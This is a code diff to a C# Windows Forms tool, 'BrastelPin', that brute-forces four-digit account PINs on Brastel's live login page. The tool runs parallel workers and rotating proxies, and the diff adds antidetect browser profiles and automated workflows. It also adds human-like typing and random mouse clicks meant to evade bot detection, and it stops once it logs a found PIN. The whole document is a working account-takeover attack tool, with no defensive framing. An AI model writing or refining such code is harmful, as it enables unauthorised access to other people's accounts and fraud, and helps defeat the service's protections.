@@ -10,15 +10,18 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Linq;
 using System.Collections.Concurrent;
+using OpenQA.Selenium.Interactions;
+using System.IO;
 
 namespace BrastelPin
 {
     public partial class MainForm : Form
     {
+        private string _successfulPIN = string.Empty;
         // Constants
         private const int MAX_CHECKS_PER_PROFILE = 10;
-        private const int ELEMENT_WAIT_MS = 5000;
-        private const int TYPING_DELAY_MS = 150;
+        private const int ELEMENT_WAIT_MS = 10000;
+        private const int TYPING_DELAY_MS = 500;
         private const int BACKSPACE_DELAY_MS = 15;
 
         private GUIDataModel _gUIDataModel = null;
@@ -36,6 +39,7 @@ namespace BrastelPin
 
         private async void btnStart_Click(object sender, EventArgs e)
         {
+            _successfulPIN = string.Empty;
             rtbLog.Clear();
 
             AddLog("[INFO] Starting PIN checking process...");
@@ -72,9 +76,9 @@ namespace BrastelPin
             }
 
             AddLog($"[INFO] Starting PIN check for account code: {_gUIDataModel.AccountCode}");
-            AddLog($"[INFO] PIN range: {_gUIDataModel.PinFrom} to {_gUIDataModel.PinTo} (Total: {totalPins} PINs)");
-            AddLog($"[INFO] Number of proxy keys: {_gUIDataModel.TMProxyKeys.Count}");
-            AddLog($"[INFO] Concurrent profiles: {_gUIDataModel.ConcurrentProfiles}");
+            //AddLog($"[INFO] PIN range: {_gUIDataModel.PinFrom} to {_gUIDataModel.PinTo} (Total: {totalPins} PINs)");
+            //AddLog($"[INFO] Number of proxy keys: {_gUIDataModel.TMProxyKeys.Count}");
+            //AddLog($"[INFO] Concurrent profiles: {_gUIDataModel.ConcurrentProfiles}");
 
             // Initialize proxy manager
             _proxyManager = new ProxyManager(_gUIDataModel.TMProxyKeys, AddLog);
@@ -98,6 +102,11 @@ namespace BrastelPin
 
                 await Task.WhenAll(workerTasks);
                 AddLog("[INFO] Completed checking all PINs.");
+                if (string.IsNullOrEmpty(_successfulPIN) == false)
+                {
+                    AddLog("[INFO] FOUND PIN: " + _successfulPIN);
+                }
+
             }
             catch (OperationCanceledException)
             {
@@ -123,7 +132,7 @@ namespace BrastelPin
             txtPinTo.Enabled = enable;
             txtTMProxy.Enabled = enable;
             txtOmniloginURL.Enabled = enable;
-            txtConcurrentProfiles.Enabled = enable;
+            txtWorkflowID.Enabled = enable;
             btnDeleteAllProfiles.Enabled = enable;
             btnStart.Enabled = enable;
             btnStop.Enabled = !enable;
@@ -134,13 +143,13 @@ namespace BrastelPin
                 btnStop.Text = "Stop";
             }
 
-            AddLog($"[INFO] Controls {(enable ? "enabled" : "disabled")}");
+            //AddLog($"[INFO] Controls {(enable ? "enabled" : "disabled")}");
         }
 
-        private async void WorkerThread(int workerId, CancellationToken cancellationToken)
+        private async Task WorkerThread(int workerId, CancellationToken cancellationToken)
         {
-            int countCheck1Profile = 0;
-            int totalProcessed = 0;
+            string profileId = string.Empty;
+            int countTry = 0;
             ProxyInfo currentProxyInfo = null;
             System.Threading.Timer proxyRotationTimer = null;
 
@@ -162,6 +171,26 @@ namespace BrastelPin
                 {
                     AddLog($"[ERROR] Worker {workerId}: Failed to get initial proxy for dedicated key");
                     return;
+                }
+                else
+                {
+                    bool result = await _omniLoginProfileManager.DeleteAllProfilesAsync();
+                    if (result)
+                    {
+                        AddLog("[INFO] Successfully deleted all profiles");
+                    }
+                    else
+                    {
+                        AddLog("[ERROR] Failed to delete all profiles");
+                    }
+
+                    AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
+                    profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", currentProxyInfo.ProxyResponse);
+                    if (string.IsNullOrEmpty(profileId))
+                    {
+                        AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
+                        return;
+                    }
                 }
 
                 AddLog($"[INFO] Worker {workerId}: Assigned dedicated API key {dedicatedApiKey.Substring(0, Math.Min(10, dedicatedApiKey.Length))}... with proxy {currentProxyInfo.ProxyResponse.data.https}");
@@ -191,9 +220,7 @@ namespace BrastelPin
 
                 while (!cancellationToken.IsCancellationRequested)
                 {
-                    countCheck1Profile = 0;
-
-                    if ((DateTime.Now - currentProxyInfo.StartTime).TotalSeconds > 150)
+                    if ((DateTime.Now - currentProxyInfo.StartTime).TotalSeconds > 121)
                     {
                         try
                         {
@@ -205,6 +232,8 @@ namespace BrastelPin
                                 {
                                     currentProxyInfo = newProxyInfo;
                                     AddLog($"[INFO] Worker {workerId}: Proxy rotated successfully to {currentProxyInfo.ProxyResponse.data.https}");
+
+                                    await _omniLoginProfileManager.ChangeProxyProfileAsync(profileId, currentProxyInfo.ProxyResponse);
                                 }
                             }
                         }
@@ -213,12 +242,6 @@ namespace BrastelPin
                             AddLog($"[ERROR] Worker {workerId}: Error during proxy rotation: {ex.Message}");
                         }
                     }
-
-
-
-
-
-
 
                     int pin;
                     lock (_queueLock)
@@ -240,169 +263,272 @@ namespace BrastelPin
                     }
 
                     string pinStr = pin.ToString("D4");
-                    AddLog($"[INFO] Worker {workerId}: Processing PIN: {pinStr}");
+                    //AddLog($"[INFO] Worker {workerId}: Processing PIN: {pinStr}");
 
                     try
                     {
 
-                        AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
-                        string profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", currentProxyInfo.ProxyResponse);
-                        if (string.IsNullOrEmpty(profileId))
+                        //AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
+                        //string profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", currentProxyInfo.ProxyResponse);
+                        //if (string.IsNullOrEmpty(profileId))
+                        //{
+                        //    AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
+                        //    break;
+                        //}
+                        if (countTry > 15)
                         {
-                            AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
+                            countTry = 0;
+                            bool result = await _omniLoginProfileManager.DeleteAllProfilesAsync();
+                            if (result)
+                            {
+                                AddLog("[INFO] Successfully deleted all profiles");
+                            }
+                            else
+                            {
+                                AddLog("[ERROR] Failed to delete all profiles");
+                            }
+                            AddLog($"[INFO] Worker {workerId}: Creating new profile with embedded proxy...");
+                            profileId = await _omniLoginProfileManager.CreateProfileAsync($"Worker{workerId}_Profile", null, "win", currentProxyInfo.ProxyResponse);
+                            if (string.IsNullOrEmpty(profileId))
+                            {
+                                AddLog($"[ERROR] Worker {workerId}: Failed to create profile");
+                                return;
+                            }
+                        }
+
+
+
+                        string output_path = @"C:\Users\PC\Documents\3.txt.txt";
+                        if (File.Exists(output_path))
+                        {
+                            File.Delete(output_path);
+                        }
+
+
+                        File.WriteAllText(@"C:\Users\PC\Documents\2.txt", pinStr);
+
+                        string taskId = await _omniLoginProfileManager.StartWorkflowAsync(_gUIDataModel.WorkflowID);
+                        if (string.IsNullOrEmpty(taskId))
+                        {
+                            AddLog($"[ERROR] Worker {workerId}: Failed to start workflow");
                             break;
                         }
-                        AddLog($"[INFO] Worker {workerId}: Profile created successfully: {profileId}");
-
-                        AddLog($"[INFO] Worker {workerId}: Starting profile...");
-                        int port = await _omniLoginProfileManager.StartProfileAndGetPortAsync(profileId);
-                        if (port == 0)
+                        AddLog($"[INFO] Worker {workerId}: Entering PIN: {pinStr}");
+                        Thread.Sleep(15000);
+                        bool isRunning = await _omniLoginProfileManager.GetWorkflowStatusAsync(taskId);
+                        while (isRunning)
                         {
-                            AddLog($"[ERROR] Worker {workerId}: Failed to start profile");
-                            await CleanupProfile(workerId, profileId);
+                            Thread.Sleep(5000);
+                            isRunning = await _omniLoginProfileManager.GetWorkflowStatusAsync(taskId);
+                        }
+
+                        if (File.Exists(output_path))
+                        {
+                            Invoke(new Action(() =>
+                           {
+                               AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr}.");
+                           }));
+                            _successfulPIN = pinStr;
+                            _cancellationTokenSource.Cancel();
                             break;
                         }
-                        AddLog($"[INFO] Worker {workerId}: Profile running on port: {port}");
-
-                        using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
+                        else
                         {
-                            AddLog($"[INFO] Worker {workerId}: Chrome driver initialized with proxy {currentProxyInfo.ProxyResponse.data.https}");
-                            AddLog($"[INFO] Worker {workerId}: Navigating to Brastel login page");
-                            driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
-                            AddLog($"[INFO] Worker {workerId}: Successfully navigated to login page");
-
-                            try
+                            Invoke(new Action(() =>
                             {
-                                AddLog($"[INFO] Worker {workerId}: Attempting login with PIN: {pinStr}");
-
-                                // Enter account code
-                                AddLog($"[INFO] Worker {workerId}: Locating account code input field");
-                                var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
-
-                                // Clear existing text
-                                for (int i = 0; i < 10; i++)
-                                {
-                                    accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
-                                    Thread.Sleep(BACKSPACE_DELAY_MS);
-                                }
-
-                                // Enter account code
-                                AddLog($"[INFO] Worker {workerId}: Entering account code: {_gUIDataModel.AccountCode}");
-                                foreach (char c in _gUIDataModel.AccountCode)
-                                {
-                                    accCodeInput.SendKeys(c.ToString());
-                                    Thread.Sleep(TYPING_DELAY_MS);
-                                }
-
-                                // Enter PIN
-                                AddLog($"[INFO] Worker {workerId}: Locating PIN input field");
-                                var pinInput = driver.FindElement(By.Id("pinInput"));
-
-                            CHECK_PIN:
-                                // Clear existing text
-                                for (int i = 0; i < 10; i++)
-                                {
-                                    pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
-                                    Thread.Sleep(BACKSPACE_DELAY_MS);
-                                }
-
-                                // Enter PIN twice (as required by the site)
-                                AddLog($"[INFO] Worker {workerId}: Entering PIN: {pinStr}");
-                                for (int pinEntry = 0; pinEntry < 2; pinEntry++)
-                                {
-                                    foreach (char c in pinStr)
-                                    {
-                                        pinInput.SendKeys(c.ToString());
-                                        Thread.Sleep(TYPING_DELAY_MS);
-                                    }
-                                }
-
-                                // Click sign in button
-                                AddLog($"[INFO] Worker {workerId}: Clicking SIGN IN button");
-                                var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
-                                ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);
-
-                                AddLog($"[INFO] Worker {workerId}: Waiting for login response...");
-                                Thread.Sleep(ELEMENT_WAIT_MS);
-
-                                // Check for error message
-                                var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
-                                if (findErrorDisplay.Displayed)
-                                {
-                                    totalProcessed++;
-                                    Invoke(new Action(() =>
-                                    {
-                                        AddLog($"[CHECKED] Worker {workerId}: PIN {pinStr} is incorrect (Processed: {totalProcessed})");
-                                    }));
-                                }
-                                else
-                                {
-                                    totalProcessed++;
-                                    Invoke(new Action(() =>
-                                    {
-                                        AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
-                                    }));
-
-                                    await CleanupProfile(workerId, profileId);
-                                    break;
-                                }
-
-                                countCheck1Profile++;
-                                AddLog($"[INFO] Worker {workerId}: Profile usage count: {countCheck1Profile}/{MAX_CHECKS_PER_PROFILE}");
-
-                                if (countCheck1Profile < MAX_CHECKS_PER_PROFILE)
-                                {
-                                    bool isEmptyQueue = false;
-                                    lock (_queueLock)
-                                    {
-                                        if (_pinQueue.Count == 0)
-                                        {
-                                            isEmptyQueue = true;
-                                        }
-                                        else
-                                        {
-                                            pin = _pinQueue.Dequeue();
-                                        }
-                                    }
-
-                                    if (isEmptyQueue)
-                                    {
-                                        AddLog($"[INFO] Worker {workerId}: Queue is empty, cleaning up profile");
-                                        await CleanupProfile(workerId, profileId);
-                                        break;
-                                    }
-                                    else
-                                    {
-                                        pinStr = pin.ToString("D4");
-                                        AddLog($"[INFO] Worker {workerId}: Reusing profile for next PIN: {pinStr}");
-                                        goto CHECK_PIN;
-                                    }
-                                }
-                                else
-                                {
-                                    AddLog($"[INFO] Worker {workerId}: Maximum profile usage reached, cleaning up");
-                                }
-
-                                await CleanupProfile(workerId, profileId);
-                            }
-                            catch (NoSuchElementException ex)
-                            {
-                                AddLog($"[ERROR] Worker {workerId}: Element not found: {ex.Message}");
-                                await CleanupProfile(workerId, profileId);
-                                break;
-                            }
-                            catch (WebDriverException ex)
-                            {
-                                AddLog($"[ERROR] Worker {workerId}: WebDriver error: {ex.Message}");
-                                await CleanupProfile(workerId, profileId);
-                                break;
-                            }
-                            finally
-                            {
-                                // Proxy is embedded in profile, no need to return it
-                                AddLog($"[INFO] Worker {workerId}: Chrome driver session completed");
-                            }
+                                AddLog($"[CHECKED] Worker {workerId}: PIN {pinStr} is incorrect.");
+                            }));
                         }
+
+                        Thread.Sleep(5000);
+
+                        countTry++;
+
+
+                        #region OLD
+                        //AddLog($"[INFO] Worker {workerId}: Profile created successfully: {profileId}");
+
+                        //AddLog($"[INFO] Worker {workerId}: Starting profile...");
+                        //OmniloginProfileData omniloginProfileData = await _omniLoginProfileManager.StartProfileAndGetDataAsync(profileId);
+                        //if (omniloginProfileData == null)
+                        //{
+                        //    AddLog($"[ERROR] Worker {workerId}: Failed to start profile");
+                        //    await CleanupProfile(workerId, profileId);
+                        //    break;
+                        //}
+                        //AddLog($"[INFO] Worker {workerId}: Profile running on port: {omniloginProfileData.remote_debug_address}");
+
+                        //using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(omniloginProfileData))
+                        //{
+                        //    AddLog($"[INFO] Worker {workerId}: Chrome driver initialized with proxy {currentProxyInfo.ProxyResponse.data.https}");
+                        //    //AddLog($"[INFO] Worker {workerId}: Navigating to Brastel login page");
+                        //    driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
+                        //    //AddLog($"[INFO] Worker {workerId}: Successfully navigated to login page");
+
+                        //    try
+                        //    {
+                        //        //AddLog($"[INFO] Worker {workerId}: Attempting login with PIN: {pinStr}");
+
+                        //        // Enter account code
+                        //        //AddLog($"[INFO] Worker {workerId}: Locating account code input field");
+                        //        var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
+                        //        //ClickRandomly(driver);
+                        //        //ClickRandomly(driver);
+                        //        //ClickRandomly(driver);
+                        //        // Clear existing text
+                        //        for (int i = 0; i < 10; i++)
+                        //        {
+                        //            accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
+                        //            Thread.Sleep(BACKSPACE_DELAY_MS);
+                        //        }
+
+                        //        // Enter account code
+                        //        AddLog($"[INFO] Worker {workerId}: Entering account code: {_gUIDataModel.AccountCode}");
+                        //        await HumanLikeTypingAdvanced(accCodeInput, _gUIDataModel.AccountCode);
+                        //        //foreach (char c in _gUIDataModel.AccountCode)
+                        //        //{
+                        //        //    accCodeInput.SendKeys(c.ToString());
+                        //        //    Thread.Sleep(TYPING_DELAY_MS);
+                        //        //}
+                        //        //ClickRandomly(driver);
+                        //        //ClickRandomly(driver);
+                        //        //ClickRandomly(driver);
+
+                        //        // Enter PIN
+                        //        //AddLog($"[INFO] Worker {workerId}: Locating PIN input field");
+                        //        var pinInput = driver.FindElement(By.Id("pinInput"));
+
+                        //    CHECK_PIN:
+                        //        // Clear existing text
+                        //        for (int i = 0; i < 10; i++)
+                        //        {
+                        //            pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
+                        //            Thread.Sleep(BACKSPACE_DELAY_MS);
+                        //        }
+                        //        //ClickRandomly(driver);
+                        //        //ClickRandomly(driver);
+                        //        //ClickRandomly(driver);
+
+                        //        // Enter PIN twice (as required by the site)
+                        //        AddLog($"[INFO] Worker {workerId}: Entering PIN: {pinStr}");
+                        //        await HumanLikeTypingAdvanced(pinInput, pinStr);
+                        //        await HumanLikeTypingAdvanced(pinInput, pinStr);
+                        //        //for (int pinEntry = 0; pinEntry < 2; pinEntry++)
+                        //        //{
+                        //        //    foreach (char c in pinStr)
+                        //        //    {
+                        //        //        pinInput.SendKeys(c.ToString());
+                        //        //        Thread.Sleep(TYPING_DELAY_MS);
+                        //        //    }
+                        //        //}
+
+                        //        ClickRandomly(driver);
+                        //        ClickRandomly(driver);
+                        //        ClickRandomly(driver);
+                        //        // Click sign in button
+                        //        //AddLog($"[INFO] Worker {workerId}: Clicking SIGN IN button");
+                        //        var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
+                        //        ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);
+
+                        //        AddLog($"[INFO] Worker {workerId}: Waiting for login response...");
+                        //        Thread.Sleep(ELEMENT_WAIT_MS);
+
+                        //        // Check for error message
+                        //        try
+                        //        {
+                        //            var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
+                        //            if (findErrorDisplay.Displayed)
+                        //            {
+                        //                totalProcessed++;
+                        //                Invoke(new Action(() =>
+                        //                {
+                        //                    AddLog($"[CHECKED] Worker {workerId}: PIN {pinStr} is incorrect (Processed: {totalProcessed})");
+                        //                }));
+                        //            }
+                        //            else
+                        //            {
+                        //                totalProcessed++;
+                        //                Invoke(new Action(() =>
+                        //                {
+                        //                    AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
+                        //                }));
+                        //                _successfulPIN = pinStr;
+                        //                await CleanupProfile(workerId, profileId);
+                        //                _cancellationTokenSource.Cancel();
+                        //                break;
+                        //            }
+                        //        }
+                        //        catch
+                        //        {
+                        //            totalProcessed++;
+                        //            Invoke(new Action(() =>
+                        //            {
+                        //                AddLog($"[SUCCESS] Worker {workerId}: Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
+                        //            }));
+                        //            _successfulPIN = pinStr;
+                        //            await CleanupProfile(workerId, profileId);
+                        //            _cancellationTokenSource.Cancel();
+                        //            break;
+                        //        }
+
+                        //        countCheck1Profile++;
+                        //        //AddLog($"[INFO] Worker {workerId}: Profile usage count: {countCheck1Profile}/{MAX_CHECKS_PER_PROFILE}");
+
+                        //        if (countCheck1Profile < MAX_CHECKS_PER_PROFILE)
+                        //        {
+                        //            bool isEmptyQueue = false;
+                        //            lock (_queueLock)
+                        //            {
+                        //                if (_pinQueue.Count == 0)
+                        //                {
+                        //                    isEmptyQueue = true;
+                        //                }
+                        //                else
+                        //                {
+                        //                    pin = _pinQueue.Dequeue();
+                        //                }
+                        //            }
+
+                        //            if (isEmptyQueue)
+                        //            {
+                        //                //AddLog($"[INFO] Worker {workerId}: Queue is empty, cleaning up profile");
+                        //                await CleanupProfile(workerId, profileId);
+                        //                break;
+                        //            }
+                        //            else
+                        //            {
+                        //                pinStr = pin.ToString("D4");
+                        //                //AddLog($"[INFO] Worker {workerId}: Reusing profile for next PIN: {pinStr}");
+                        //                goto CHECK_PIN;
+                        //            }
+                        //        }
+                        //        else
+                        //        {
+                        //            //AddLog($"[INFO] Worker {workerId}: Maximum profile usage reached, cleaning up");
+                        //        }
+
+                        //        await CleanupProfile(workerId, profileId);
+                        //    }
+                        //    catch (NoSuchElementException ex)
+                        //    {
+                        //        AddLog($"[ERROR] Worker {workerId}: Element not found: {ex.Message}");
+                        //        await CleanupProfile(workerId, profileId);
+                        //        break;
+                        //    }
+                        //    catch (WebDriverException ex)
+                        //    {
+                        //        AddLog($"[ERROR] Worker {workerId}: WebDriver error: {ex.Message}");
+                        //        await CleanupProfile(workerId, profileId);
+                        //        break;
+                        //    }
+                        //    finally
+                        //    {
+                        //        // Proxy is embedded in profile, no need to return it
+                        //        AddLog($"[INFO] Worker {workerId}: Chrome driver session completed");
+                        //    }
+                        //}
+
+                        #endregion
                     }
                     catch (Exception ex)
                     {
@@ -420,22 +546,71 @@ namespace BrastelPin
                 if (!string.IsNullOrEmpty(currentProxyInfo?.ApiKey))
                 {
                     _proxyManager.ReleaseDedicatedApiKey(workerId);
-                    AddLog($"[INFO] Worker {workerId}: Released dedicated API key and cleaned up resources");
+                    //AddLog($"[INFO] Worker {workerId}: Released dedicated API key and cleaned up resources");
                 }
             }
         }
+
+        public async Task HumanLikeTypingAdvanced(IWebElement element, string text, double errorChance = 0.1)
+        {
+            Random rand = new Random();
+            string[] randomWrongChars = { "q", "w", "e", "r", "t", "y", "u", "i", "o", "p" };
+
+            foreach (char c in text)
+            {
+                // Simulate random typo
+                bool makeMistake = rand.NextDouble() < errorChance;
+
+                //if (makeMistake)
+                //{
+                //    string wrongChar = randomWrongChars[rand.Next(randomWrongChars.Length)];
+                //    element.SendKeys(wrongChar);
+                //    await Task.Delay(rand.Next(80, 200));
+
+                //    // Simulate backspace
+                //    element.SendKeys(OpenQA.Selenium.Keys.Backspace);
+                //    await Task.Delay(rand.Next(80, 150));
+                //}
+
+                // Type correct char
+                element.SendKeys(c.ToString());
+                await Task.Delay(rand.Next(200, 500)); // Delay between characters
+            }
+        }
+
+        public void ClickRandomly(IWebDriver driver)
+        {
+            Random rand = new Random();
+
+            // Lấy kích thước của cửa sổ trình duyệt
+            int width = driver.Manage().Window.Size.Width;
+            int height = driver.Manage().Window.Size.Height;
+
+            // Chọn vị trí ngẫu nhiên trong khoảng an toàn (tránh mép)
+            int x = rand.Next(100, width - 100);
+            int y = rand.Next(100, height - 100);
+
+            Console.WriteLine($"Clicking at random position: ({x}, {y})");
+
+            Actions actions = new Actions(driver);
+            actions.MoveByOffset(x, y).Click().Perform();
+
+            // Đưa chuột trở về vị trí ban đầu để tránh offset trong lệnh sau
+            actions.MoveByOffset(-x, -y).Perform();
+        }
+
 
         private async Task CleanupProfile(int workerId, string profileId)
         {
             try
             {
-                AddLog($"[INFO] Worker {workerId}: Stopping profile: {profileId}");
+                //AddLog($"[INFO] Worker {workerId}: Stopping profile: {profileId}");
                 await _omniLoginProfileManager.StopProfileAsync(profileId);
 
-                AddLog($"[INFO] Worker {workerId}: Deleting profile: {profileId}");
+                //AddLog($"[INFO] Worker {workerId}: Deleting profile: {profileId}");
                 await _omniLoginProfileManager.DeleteProfileAsync(profileId);
 
-                AddLog($"[INFO] Worker {workerId}: Profile cleanup completed: {profileId}");
+                //AddLog($"[INFO] Worker {workerId}: Profile cleanup completed: {profileId}");
             }
             catch (Exception ex)
             {
@@ -459,7 +634,7 @@ namespace BrastelPin
             txtPinTo.Text = _gUIDataModel.PinTo.ToString();
             txtTMProxy.Text = _gUIDataModel.TMProxy;
             txtOmniloginURL.Text = _gUIDataModel.OmniloginURL;
-            txtConcurrentProfiles.Text = _gUIDataModel.ConcurrentProfiles.ToString();
+            txtWorkflowID.Text = _gUIDataModel.WorkflowID.ToString();
 
             // Setup event handlers
             txtAccountCode.TextChanged += new EventHandler(TextBoxTextChanged);
@@ -467,7 +642,7 @@ namespace BrastelPin
             txtTMProxy.TextChanged += new EventHandler(TextBoxTextChanged);
             txtPinTo.TextChanged += new EventHandler(TextBoxTextChanged);
             txtOmniloginURL.TextChanged += new EventHandler(TextBoxTextChanged);
-            txtConcurrentProfiles.TextChanged += new EventHandler(TextBoxTextChanged);
+            txtWorkflowID.TextChanged += new EventHandler(TextBoxTextChanged);
 
             AddLog("[INFO] Application initialized successfully");
         }
@@ -487,10 +662,10 @@ namespace BrastelPin
                 _gUIDataModel.PinTo = int.Parse(txtPinTo.Text);
                 _gUIDataModel.TMProxy = txtTMProxy.Text;
                 _gUIDataModel.OmniloginURL = txtOmniloginURL.Text;
-                _gUIDataModel.ConcurrentProfiles = int.Parse(txtConcurrentProfiles.Text);
+                _gUIDataModel.WorkflowID = txtWorkflowID.Text;
                 _gUIDataModel.SaveToFile();
 
-                AddLog("[INFO] Configuration updated and saved");
+                //AddLog("[INFO] Configuration updated and saved");
             }
             catch (Exception ex)
             {
@@ -511,20 +686,6 @@ namespace BrastelPin
                 return;
             }
 
-            TextBox tb = sender as TextBox;
-            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());
-
-            if (int.TryParse(newText, out int value))
-            {
-                if (value > 9999)
-                {
-                    e.Handled = true;
-                }
-            }
-            else
-            {
-                e.Handled = true;
-            }
         }
 
         private void TextBoxConcurrentProfilesKeyPress(object sender, KeyPressEventArgs e)
@@ -540,20 +701,20 @@ namespace BrastelPin
                 return;
             }
 
-            TextBox tb = sender as TextBox;
-            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());
+            //TextBox tb = sender as TextBox;
+            //string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());
 
-            if (int.TryParse(newText, out int value))
-            {
-                if (value > 50) // Maximum 50 concurrent profiles
-                {
-                    e.Handled = true;
-                }
-            }
-            else
-            {
-                e.Handled = true;
-            }
+            //if (int.TryParse(newText, out int value))
+            //{
+            //    if (value > 50) // Maximum 50 concurrent profiles
+            //    {
+            //        e.Handled = true;
+            //    }
+            //}
+            //else
+            //{
+            //    e.Handled = true;
+            //}
         }
 
         private void AddLog(string log)
@@ -597,7 +758,7 @@ namespace BrastelPin
             txtPinTo.Enabled = enableControl;
             txtTMProxy.Enabled = enableControl;
             txtOmniloginURL.Enabled = enableControl;
-            txtConcurrentProfiles.Enabled = enableControl;
+            txtWorkflowID.Enabled = enableControl;
             btnDeleteAllProfiles.Enabled = enableControl;
             btnStart.Enabled = enableControl;
             btnStop.Enabled = enableControl;
@@ -625,12 +786,12 @@ namespace BrastelPin
             txtPinTo.Enabled = enableControl;
             txtTMProxy.Enabled = enableControl;
             txtOmniloginURL.Enabled = enableControl;
-            txtConcurrentProfiles.Enabled = enableControl;
+            txtWorkflowID.Enabled = enableControl;
             btnDeleteAllProfiles.Enabled = enableControl;
             btnStart.Enabled = enableControl;
             btnStop.Enabled = enableControl;
 
-            AddLog("[INFO] All controls re-enabled");
+            //AddLog("[INFO] All controls re-enabled");
         }
     }
 
@@ -646,7 +807,6 @@ namespace BrastelPin
         private readonly ConcurrentDictionary<int, string> _workerApiKeys; // workerId -> apiKey mapping
         private readonly object _lock = new object();
         private bool _disposed = false;
-        private int _currentKeyIndex = 0;
 
         public ProxyManager(List<string> proxyKeys, Action<string> logAction)
         {
@@ -658,7 +818,7 @@ namespace BrastelPin
 
         public void InitializeProxiesAsync()
         {
-            _logAction("[INFO] Initializing proxy manager...");
+            //_logAction("[INFO] Initializing proxy manager...");
             // No need to initialize all proxies upfront since each worker will get its own
             _logAction($"[INFO] Proxy manager initialized with {_proxyKeys.Count} API keys available");
         }
@@ -697,7 +857,7 @@ namespace BrastelPin
             {
                 // Also remove from proxy pool
                 _proxyPool.TryRemove(apiKey, out _);
-                _logAction($"[INFO] Released API key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... from worker {workerId}");
+                //_logAction($"[INFO] Released API key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}... from worker {workerId}");
             }
         }
 
@@ -729,6 +889,7 @@ namespace BrastelPin
                         // Update the proxy in pool
                         _proxyPool.AddOrUpdate(apiKey, proxyInfo, (key, oldValue) => proxyInfo);
                         _logAction($"[INFO] Proxy obtained successfully for key {apiKey.Substring(0, Math.Min(10, apiKey.Length))}...: {proxyResponse.data.https}");
+
                         return proxyInfo;
                     }
                     else
@@ -789,7 +950,7 @@ namespace BrastelPin
         {
             if (!_disposed)
             {
-                _logAction("[INFO] Disposing proxy manager");
+                //_logAction("[INFO] Disposing proxy manager");
                 _proxyPool.Clear();
                 _workerApiKeys.Clear();
                 _disposed = true;
